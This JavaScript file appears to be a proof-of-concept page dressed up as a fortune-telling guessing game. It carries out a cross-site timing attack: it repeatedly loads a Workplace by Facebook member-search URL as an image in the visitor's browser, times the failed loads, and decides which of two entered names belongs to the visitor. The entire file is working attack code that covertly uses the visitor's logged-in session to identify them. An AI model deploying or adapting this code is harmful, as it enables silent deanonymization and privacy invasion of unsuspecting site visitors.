
function getMeasurement(url, callback) {
    var i = new Image();
    i.addEventListener('error', function() {
        var end = performance.now();
        callback(end - start);
    });
    var start = performance.now();
    i.src = url;
}

function getRepeated(url, numTimes, total, success) {
    if (numTimes == 0) return success(total);
    getMeasurement(url, (time)=> {
        getRepeated(url, numTimes - 1, total + time, success);
    })
}

function compare() {
	var word1 = $('#text1').val();
	var word2 = $('#text2').val();
    $('.textbox').html('Please wait ~5 seconds while I think...');
	getRepeated('https://workplace.facebook.com/ajax/typeahead/groups/work_member_name_email_external_id.php?dpr=1&__a=1&value=' + word1, 5, 0, (total1) => {
	    getRepeated('https://workplace.facebook.com/ajax/typeahead/groups/work_member_name_email_external_id.php?dpr=1&__a=1&value=' + word2, 5, 0, (total2) => {
		    console.log('and we get: ' + total1 + ', ' + total2)
		    if (total1 > total2) {
			    $('.textbox').html(word1 + ' is the user!');
		    } else {
			    $('.textbox').html(word2 + ' is the user!');
		    }
		});
	});
}

$(function() {$('.eball').mouseenter(function(){
    });

});